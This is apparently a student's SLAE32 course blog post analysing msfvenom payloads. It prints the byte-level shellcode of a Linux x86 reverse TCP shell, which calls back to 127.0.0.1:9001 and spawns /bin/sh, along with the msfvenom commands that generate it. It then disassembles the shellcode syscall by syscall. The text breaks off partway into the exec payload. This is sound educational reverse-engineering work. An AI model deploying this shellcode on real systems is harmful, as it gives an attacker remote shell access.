    <div class="post-meta"><span title='2022-12-29 10:58:18 +0000 UTC'>December 29, 2022</span>&nbsp;·&nbsp;15 min&nbsp;·&nbsp;nibbles

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#introduction" aria-label="Introduction">Introduction</a></li>
                <li>
                    <a href="#shellcode-1---linuxx86shell_reverse_tcp" aria-label="Shellcode 1 - linux/x86/shell_reverse_tcp">Shellcode 1 - linux/x86/shell_reverse_tcp</a><ul>
                        <ul>
                        <ul>
                        
                <li>
                    <a href="#1---socketcall-syscall-with-sys_socket" aria-label="1 - Socketcall Syscall with SYS_SOCKET">1 - Socketcall Syscall with SYS_SOCKET</a></li>
                <li>
                    <a href="#2---dup2-syscall" aria-label="2 - dup2() syscall">2 - dup2() syscall</a></li>
                <li>
                    <a href="#3---socketcall-with-sys_connect" aria-label="3 - socketcall with SYS_CONNECT">3 - socketcall with SYS_CONNECT</a></li>
                <li>
                    <a href="#4---execve" aria-label="4 - Execve()">4 - Execve()</a></li></ul>
                    </ul>
                    </ul>
                </li>
                <li>
                    <a href="#shellcode-2---linuxx86exec" aria-label="Shellcode 2 - linux/x86/exec">Shellcode 2 - linux/x86/exec</a><ul>
                        <ul>
                        <ul>
                        
                <li>
                    <a href="#call-0x24" aria-label="call 0x24">call 0x24</a></li></ul>
                    </ul>
                    </ul>
                </li>
                <li>
                    <a href="#shellcode-3---linuxx86chmod" aria-label="Shellcode 3 - linux/x86/chmod">Shellcode 3 - linux/x86/chmod</a></li>
                <li>
                    <a href="#lessons-learned" aria-label="Lessons learned">Lessons learned</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><img loading="lazy" src="/slae32/slae32.png#center" alt="SLAE32"  title="SLAE32"  />
</p>
<p>This post introduces the 5th mission to my SLAE32 journey.</p>
<p>A cool task to see how a widely used tool by the offensive security community produces shellcode and compare it with my own developed ones. New tricks and new cool learned.</p>
<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
<p>The SLAE32 5th assignment purpose is to select 3 msfvenom payloads and document my own analysis of them.</p>
<p>For this task I selected the following payloads:</p>
<ul>
<li>linux/x86/shell_reverse_tcp</li>
<li>linux/x86/exec</li>
<li>linux/x86/chmod</li>
</ul>
<h2 id="shellcode-1---linuxx86shell_reverse_tcp">Shellcode 1 - linux/x86/shell_reverse_tcp<a hidden class="anchor" aria-hidden="true" href="#shellcode-1---linuxx86shell_reverse_tcp">#</a></h2>
<hr>
<blockquote>
<p>I chose this one to compare the msfvenom shellcode to the code of my first assignment. I was curious to know if I wrote something similar or if there were some tricks that I could used to improve my shellcode knowledge.</p>
</blockquote>
<p>The first step to do is geenrate the shellcode using MSF. As usual, let&rsquo;s check its arguments</p>
<p><code>msfvenom -p linux/x86/exec --list-options</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x86/shell_reverse_tcp --list-options
</span></span><span style="display:flex;"><span>Options <span style="color:#66d9ef">for</span> payload/linux/x86/shell_reverse_tcp:
</span></span><span style="display:flex;"><span><span style="color:#f92672">=========================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       Name: Linux Command Shell, Reverse TCP Inline
</span></span><span style="display:flex;"><span>     Module: payload/linux/x86/shell_reverse_tcp
</span></span><span style="display:flex;"><span>   Platform: Linux
</span></span><span style="display:flex;"><span>       Arch: x86
</span></span><span style="display:flex;"><span>Needs Admin: No
</span></span><span style="display:flex;"><span> Total size: <span style="color:#ae81ff">68</span>
</span></span><span style="display:flex;"><span>       Rank: Normal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Provided by:
</span></span><span style="display:flex;"><span>    Ramon de C Valle &lt;rcvalle@metasploit.com&gt;
</span></span><span style="display:flex;"><span>    joev &lt;joev@metasploit.com&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Basic options:
</span></span><span style="display:flex;"><span>Name   Current Setting  Required  Description
</span></span><span style="display:flex;"><span>----   ---------------  --------  -----------
</span></span><span style="display:flex;"><span>CMD    /bin/sh          yes       The command string to execute
</span></span><span style="display:flex;"><span>LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Description:
</span></span><span style="display:flex;"><span>  Connect back to attacker and spawn a command shell
</span></span></code></pre></div><p>With this information, we can generate our shellcode</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x86/shell_reverse_tcp lhost<span style="color:#f92672">=</span>127.0.0.1 lport<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span> -f c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">68</span> bytes
</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">311</span> bytes
</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x01\x68\x02\x00\x23\x29\x89\xe1\xb0\x66\x50\x51\x53\xb3&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80&#34;</span>;
</span></span></code></pre></div><p>Using ndisasm:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo -ne <span style="color:#e6db74">&#34;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x23\x29\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80&#34;</span> | ndisasm -u -
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  31DB              xor ebx,ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000002</span>  F7E3              mul ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000004</span>  <span style="color:#ae81ff">53</span>                push ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000005</span>  <span style="color:#ae81ff">43</span>                inc ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000006</span>  <span style="color:#ae81ff">53</span>                push ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000007</span>  6A02              push byte +0x2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000009</span>  89E1              mov ecx,esp
</span></span><span style="display:flex;"><span>0000000B  B066              mov al,0x66
</span></span><span style="display:flex;"><span>0000000D  CD80              int 0x80
</span></span><span style="display:flex;"><span>0000000F  <span style="color:#ae81ff">93</span>                xchg eax,ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000010</span>  <span style="color:#ae81ff">59</span>                pop ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000011</span>  B03F              mov al,0x3f
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000013</span>  CD80              int 0x80
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000015</span>  <span style="color:#ae81ff">49</span>                dec ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000016</span>  79F9              jns 0x11
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000018</span>  687F000001        push dword 0x100007f
</span></span><span style="display:flex;"><span>0000001D  <span style="color:#ae81ff">6802002329</span>        push dword 0x29230002
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000022</span>  89E1              mov ecx,esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000024</span>  B066              mov al,0x66
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000026</span>  <span style="color:#ae81ff">50</span>                push eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000027</span>  <span style="color:#ae81ff">51</span>                push ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000028</span>  <span style="color:#ae81ff">53</span>                push ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000029</span>  B303              mov bl,0x3
</span></span><span style="display:flex;"><span>0000002B  89E1              mov ecx,esp
</span></span><span style="display:flex;"><span>0000002D  CD80              int 0x80
</span></span><span style="display:flex;"><span>0000002F  <span style="color:#ae81ff">52</span>                push edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000030</span>  686E2F7368        push dword 0x68732f6e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000035</span>  682F2F6269        push dword 0x69622f2f
</span></span><span style="display:flex;"><span>0000003A  89E3              mov ebx,esp
</span></span><span style="display:flex;"><span>0000003C  <span style="color:#ae81ff">52</span>                push edx
</span></span><span style="display:flex;"><span>0000003D  <span style="color:#ae81ff">53</span>                push ebx
</span></span><span style="display:flex;"><span>0000003E  89E1              mov ecx,esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000040</span>  B00B              mov al,0xb
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000042</span>  CD80              int 0x80
</span></span></code></pre></div><p>Filtering just by the assembly instruction with awk. The output is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo -ne <span style="color:#e6db74">&#34;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x23\x29\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80&#34;</span> | ndisasm -u - | awk <span style="color:#e6db74">&#39;{ print $3,$4,$5 }&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>xor ebx,ebx 
</span></span><span style="display:flex;"><span>mul ebx 
</span></span><span style="display:flex;"><span>push ebx 
</span></span><span style="display:flex;"><span>inc ebx 
</span></span><span style="display:flex;"><span>push ebx 
</span></span><span style="display:flex;"><span>push byte +0x2
</span></span><span style="display:flex;"><span>mov ecx,esp 
</span></span><span style="display:flex;"><span>mov al,0x66 
</span></span><span style="display:flex;"><span>int 0x80 
</span></span><span style="display:flex;"><span>xchg eax,ebx 
</span></span><span style="display:flex;"><span>pop ecx 
</span></span><span style="display:flex;"><span>mov al,0x3f 
</span></span><span style="display:flex;"><span>int 0x80 
</span></span><span style="display:flex;"><span>dec ecx 
</span></span><span style="display:flex;"><span>jns 0x11 
</span></span><span style="display:flex;"><span>push dword 0x100007f
</span></span><span style="display:flex;"><span>push dword 0x29230002
</span></span><span style="display:flex;"><span>mov ecx,esp 
</span></span><span style="display:flex;"><span>mov al,0x66 
</span></span><span style="display:flex;"><span>push eax 
</span></span><span style="display:flex;"><span>push ecx 
</span></span><span style="display:flex;"><span>push ebx 
</span></span><span style="display:flex;"><span>mov bl,0x3 
</span></span><span style="display:flex;"><span>mov ecx,esp 
</span></span><span style="display:flex;"><span>int 0x80 
</span></span><span style="display:flex;"><span>push edx 
</span></span><span style="display:flex;"><span>push dword 0x68732f6e
</span></span><span style="display:flex;"><span>push dword 0x69622f2f
</span></span><span style="display:flex;"><span>mov ebx,esp 
</span></span><span style="display:flex;"><span>push edx 
</span></span><span style="display:flex;"><span>push ebx 
</span></span><span style="display:flex;"><span>mov ecx,esp 
</span></span><span style="display:flex;"><span>mov al,0xb 
</span></span><span style="display:flex;"><span>int 0x80
</span></span></code></pre></div><p>Looking to the first syscall, we We can see the same syscall with value 0x66 or 102 in decimal is passed to eax. this corresponds to <code>socketcall</code> syscall as can be seen in the image below.</p>
<p><img loading="lazy" src="/slae32/5/reverse/image2.png#center" alt="socketcall"  title="socketcall"  />
</p>
<p>A different from what was done in the first assignment. From analysing the code, using socketcall instead of calling the other 4 different syscalls seems to be a more clean and organized way to achieve the same result.
The way socketcall works is by put a <code>SYS_CALL</code> value in <code>ebx</code>, store its arguments onto the stack and pointing <code>ecx</code> to <code>esp</code> which corresponds to the address where the beginning of the arguments are placed.</p>
<p>Let&rsquo;s separate the shellcode in &ldquo;syscall pieces of code&rdquo; by analysing each syscall and how the stack was organized.</p>
<h5 id="1---socketcall-syscall-with-sys_socket">1 - Socketcall Syscall with SYS_SOCKET<a hidden class="anchor" aria-hidden="true" href="#1---socketcall-syscall-with-sys_socket">#</a></h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ebx</span>,<span style="color:#66d9ef">ebx</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">mul</span> <span style="color:#66d9ef">ebx</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">push</span> <span style="color:#66d9ef">ebx</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">inc</span> <span style="color:#66d9ef">ebx</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">push</span> <span style="color:#66d9ef">ebx</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">esp</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">al</span>,<span style="color:#ae81ff">0x66</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#ae81ff">0x80</span> 
</span></span></code></pre></div><p>Investigating the <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">man page</a> (man 2 socketcall) shows the structure as <code>int socketcall(int call, unsigned long *args);</code> .</p>
<p><code>call</code> parameter determines which socket function to invoke. <code>args</code> points to a block containing the actual arguments, which are passed through to the appropriate call.</p>
<p>Let&rsquo;s check how the shellcode prepares the stack and then invokes socketcall.</p>
<p>It starts with the usual register clearing. In this case used <code>xor ebx, ebx</code> in conjunction with <code>mul ebx</code> to clear <code>eax</code> and <code>edx</code>. The advange or trick with this approach is to save one line of code.</p>
<p>After that, <code>ebx</code> is pushed onto the stack. At this point, ebx has the value 0 which satisfies the protocol value needed for <code>SYS_SOCKET</code>. just a reminder for <code>SYS_SOCKET</code> structure: <code>socket(PF_INET (2), SOCK_STREAM (1), IPPROTO_IP (0))</code></p>
<p>The same thing we&rsquo;ve done when bulding our bind shell. This way pushing ebx the <code>SOCK_STREAM</code> argument is satisfied.</p>
<p>Next, <code>ebx</code> is incremented which refers to the <code>SYS_SOCKET</code> argument we mentioned above. Then, <code>0x2</code> value which represents <code>PF_INET</code> is pushed tot eh stack to complete the task.</p>
<p>Lastly, teh address pointed by <code>esp</code> is passed to <code>ecx</code> as it references the arguments we have pushed on the stack. The last instruction (int 0x80) performs the interruption call. If successful sockfd file descriptor is stored in <code>eax by default</code>.</p>
<h5 id="2---dup2-syscall">2 - dup2() syscall<a hidden class="anchor" aria-hidden="true" href="#2---dup2-syscall">#</a></h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xchg</span> <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">ebx</span>    <span style="color:#75715e">; storing sockfd file descriptor in ebx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ecx</span>		    <span style="color:#75715e">;puts 0x2 in ecx. this is going to be our coutner register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>,<span style="color:#ae81ff">0x3f</span> 	<span style="color:#75715e">; moving dup2() syscall value to al register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span> 		<span style="color:#75715e">; calling dup2()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">dec</span> <span style="color:#66d9ef">ecx</span> 		<span style="color:#75715e">; decrement counter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jns</span> <span style="color:#ae81ff">0x11</span> 		<span style="color:#75715e">; jump near if not sign. Jumps if SF=0  
</span></span></span></code></pre></div><p>From the code it calls <code>dup2()</code>  instead of <code>connect()</code> which appears to be a different approachwe have performed before.</p>
<p><code>dup2()</code> takes sockfd file descriptor created from <code>SYS_SOCKET</code> interruption call and duplciates 0 (stdin),1 (stdout) and 2 (stderr) file descriptors using <code>ecx</code> register. This allows us to create an interactive shell.</p>
<blockquote>
<p>The best part is how it handles the loop with the instruction <code>jns 0x11</code>.</p>
<p>Why <code>0x11</code>?</p>
<p>ndisasm gives the answer.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#ae81ff">00000011</span>  B03F              mov al,0x3f
</span></span></code></pre></div><p>0x11 is a <code>relative address</code> or <code>distance</code> from the first instruction of the entire shellcode. So this will jump to 11 bytes after the first instruction (<code>00000000  31DB xor ebx,ebx</code>) if the loop condition is met.</p>
<h5 id="3---socketcall-with-sys_connect">3 - socketcall with SYS_CONNECT<a hidden class="anchor" aria-hidden="true" href="#3---socketcall-with-sys_connect">#</a></h5>
<p>Checking connect man page is has the following structure -&gt; <code>int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</code></p>
<ul>
<li><code>int sockfd</code> is stored in ebx</li>
<li>The struct structure is <code>0x100007f</code> (127.0.0.1 - destination IP), <code>0x2923</code> (9001 - remote port) and <code>AF_NET (2)</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">dword</span> <span style="color:#ae81ff">0x100007f</span>	<span style="color:#75715e">; pushing 127.0.0.1 remote IP   
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">dword</span> <span style="color:#ae81ff">0x29230002</span>	<span style="color:#75715e">; pushing port 9001 and AF_INET   
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">esp</span> 			<span style="color:#75715e">; pointing ecx to the top of the stack which where is the struct&#39;s location
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>,<span style="color:#ae81ff">0x66</span> 			<span style="color:#75715e">; moving socketcall() ssycall number to al register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">eax</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">push</span> <span style="color:#66d9ef">ecx</span> 			<span style="color:#75715e">; push ; sockaddr_in* addr 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ebx</span> 			<span style="color:#75715e">; push sockfd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>,<span style="color:#ae81ff">0x3</span> 			<span style="color:#75715e">; SYS_CONNECT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">esp</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#ae81ff">0x80</span> 
</span></span></code></pre></div><p>After constructing the sockaddr struct it becames straightforward to call <code>SYS_CONNECT</code>.</p>
<h5 id="4---execve">4 - Execve()<a hidden class="anchor" aria-hidden="true" href="#4---execve">#</a></h5>
<p>The execve organization appears to have the same instruction has what has been done in previous assigments. Not a lot of difference should be from it in the MSF shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span> 			    <span style="color:#75715e">; pushing a null terminator onto the stack  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">dword</span> <span style="color:#ae81ff">0x68732f6e</span>	<span style="color:#75715e">; pushing &#39;hs//&#39; onto the stack  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">dword</span> <span style="color:#ae81ff">0x69622f2f</span>	<span style="color:#75715e">; pushing &#39;nib/&#39; onto the stack 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>,<span style="color:#66d9ef">esp</span> 			<span style="color:#75715e">; storing the stack pointer to /bin//sh in ebx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span> 			    <span style="color:#75715e">; pushing a null terminator  to build another argument
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ebx</span> 			    <span style="color:#75715e">; the /bin//sh stack pointer address we had stored in ebx  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">esp</span> 			<span style="color:#75715e">; pass to ecx the stack pointer for our arguments  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>,<span style="color:#ae81ff">0xb</span> 			    <span style="color:#75715e">; execve syscall number
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span> 
</span></span></code></pre></div><h2 id="shellcode-2---linuxx86exec">Shellcode 2 - linux/x86/exec<a hidden class="anchor" aria-hidden="true" href="#shellcode-2---linuxx86exec">#</a></h2>
<hr>
<p>Firstly, let&rsquo;s check the requried argumets for the exec shellcode with the command</p>
<p><code>msfvenom -p linux/x86/exec --list-options</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x86/exec --list-options
</span></span><span style="display:flex;"><span>Options <span style="color:#66d9ef">for</span> payload/linux/x86/exec:
</span></span><span style="display:flex;"><span><span style="color:#f92672">=========================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       Name: Linux Execute Command
</span></span><span style="display:flex;"><span>     Module: payload/linux/x86/exec
</span></span><span style="display:flex;"><span>   Platform: Linux
</span></span><span style="display:flex;"><span>       Arch: x86
</span></span><span style="display:flex;"><span>Needs Admin: No
</span></span><span style="display:flex;"><span> Total size: <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>       Rank: Normal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Provided by:
</span></span><span style="display:flex;"><span>    vlad902 &lt;vlad902@gmail.com&gt;
</span></span><span style="display:flex;"><span>    Geyslan G. Bem &lt;geyslan@gmail.com&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Basic options:
</span></span><span style="display:flex;"><span>Name  Current Setting  Required  Description
</span></span><span style="display:flex;"><span>----  ---------------  --------  -----------
</span></span><span style="display:flex;"><span>CMD                    no        The command string to execute
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Description:
</span></span><span style="display:flex;"><span>  Execute an arbitrary command or just a /bin/sh shell
</span></span></code></pre></div><p>Generating our shellcode with <code>msfvenom</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x86/exec CMD<span style="color:#f92672">=</span>whoami -f c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">42</span> bytes
</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">201</span> bytes
</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x07\x00\x00&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x00\x77\x68\x6f\x61\x6d\x69\x00\x57\x53\x89\xe1\xcd\x80&#34;</span>;
</span></span></code></pre></div><p>Using ndisasm:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo -ne <span style="color:#e6db74">&#34;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x57\x53\x89\xe1\xcd\x80&#34;</span> | ndisasm -u -
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Output:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  6A0B              push byte +0xb
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000002</span>  <span style="color:#ae81ff">58</span>                pop eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000003</span>  <span style="color:#ae81ff">99</span>                cdq
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000004</span>  <span style="color:#ae81ff">52</span>                push edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000005</span>  66682D63          push word 0x632d
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000009</span>  89E7              mov edi,esp
</span></span><span style="display:flex;"><span>0000000B  682F736800        push dword 0x68732f
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000010</span>  682F62696E        push dword 0x6e69622f
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000015</span>  89E3              mov ebx,esp
